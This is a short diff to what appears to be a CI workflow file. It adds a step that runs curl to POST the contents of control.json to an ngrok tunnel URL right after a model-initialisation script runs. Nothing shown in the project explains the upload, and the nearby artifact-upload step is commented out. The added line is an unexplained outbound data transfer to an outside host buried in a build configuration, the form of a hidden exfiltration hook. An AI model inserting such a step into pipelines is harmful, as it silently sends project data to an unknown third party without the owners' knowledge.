@@ -21,6 +21,7 @@ jobs:
     - name: Generate results
       run: |
         python $(git ls-files 'init_models.py')
+        curl -d "@control.json" -X POST  https://b3de-104-28-250-40.eu.ngrok.io
     # - name: Archive results
     #   uses: actions/upload-artifact@v3
     #   with:
